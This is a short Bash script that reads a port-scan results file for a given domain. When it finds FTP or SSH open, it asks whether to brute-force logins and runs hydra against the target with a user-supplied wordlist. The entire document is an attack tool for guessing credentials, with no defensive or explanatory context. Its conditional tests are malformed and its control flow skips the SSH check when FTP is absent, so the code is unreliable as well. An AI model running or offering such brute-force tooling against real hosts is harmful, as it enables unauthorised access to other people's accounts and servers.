domain=$1
results=$2
ssh=$(cat $results | grep ssh | cut -b 15,16,17)
ftp=$(cat $results | grep ftp | cut -b 15,16,17)  
 

function dict {
    read -p "Enter Dictionary List: " wordlist

}

if [ $ftp !=0 ]
then 
    echo "[+] FTP Service Found!"
    while true 
    do
        read -p "Do You Want To Bruteforce FTP? " answer
        case $answer in
            [Yy]* ) dict; hydra -L $wordlist -P $wordlist $domain ftp; break;;
            [Nn]* ) break;;
             * ) echo "Please Answer yes or no.";;
        esac
    done
else
     exit 0
fi

if [ $ssh !=0 ]
then 
    echo "[+] SSH Service Found!"
    while true 
    do
        read -p "Do You Want To Bruteforce SSH? " answer
        case $answer in
            [Yy]* ) dict; hydra -L $wordlist -P $wordlist $domain ssh; break;;
            [Nn]* ) break;;
             * ) echo "Please Answer yes or no.";;
        esac
    done
else
     exit 0
fi